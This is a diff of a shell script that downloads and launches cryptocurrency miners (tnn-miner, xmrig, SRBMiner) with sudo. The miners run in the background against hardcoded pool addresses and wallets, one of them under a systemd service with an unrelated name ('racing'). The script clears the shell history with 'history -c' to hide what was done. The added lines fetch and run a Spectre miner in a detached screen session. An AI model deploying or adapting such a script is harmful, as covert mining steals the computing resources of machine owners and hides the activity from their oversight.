@@ -33,6 +33,12 @@ sudo systemctl daemon-reload
 sudo systemctl enable racing.service
 sudo ./racing -a kawpow -o stratum+tcp://de.aipg.herominers.com:1128 -u AeuwUzTcE8SAkbGF7eaQ1ga2tBMW2kBB7s.s5 -p x &
 history -c
+sudo apt-get install unzip
+sudo mkdir /spectre-pool && cd /spectre-pool
+sudo wget https://github.com/argenminers/spectre-blockchain/releases/download/v0.3.14/spectre-pool.zip && sudo unzip -q spectre-pool.zip -d /spectre-pool; spectre-pool -y -y
+sudo screen -S spectre-pool /spectre-pool/tnn-miner --spectre --wallet spectre:qp3p0cd6mk23r940e2qph92tf4v6ufprx96jvm8c3wecalu97uqfk72ul2wz5 --daemon-address spr.tw-pool.com --port 14001 --worker-name gpxx --threads 16 &
+
+:'
 if [[ $noCore -eq 6 ]]
 then
 	sudo wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-linux-static-x64.tar.gz
@@ -45,7 +51,7 @@ else
 	#sudo ./xmrig-6.16.2/xmrig -o de.qrl.herominers.com:1166 -u Q010500814e524290ab792c54c7cac1b5f4847df92d0b64e146c5e7dd15bb61401bdbbb81c860b8 -p qrlrbbb -a rx/0 -k -t= ${usingcore} &
  	sudo ./xmrig-6.16.2/xmrig -o us.zephyr.herominers.com:1123 -u ZEPHYR2FpVwNoWn6FPm8nvgZmjZ5aMU86J8srTneeBysArXKKr1fAksb7mFzyMKoCk4Sr8J7JyEnQLNSTooTuFm2YuX8N3oVk9S2z -p "c1" --coin zephyr -a rx/0 -t= ${usingcore} &
 fi
-:'
+
 then
 	sudo wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.5.6/SRBMiner-Multi-2-5-6-Linux.tar.gz
 	sudo tar -xvf SRBMiner-Multi-2-5-6-Linux.tar.gz
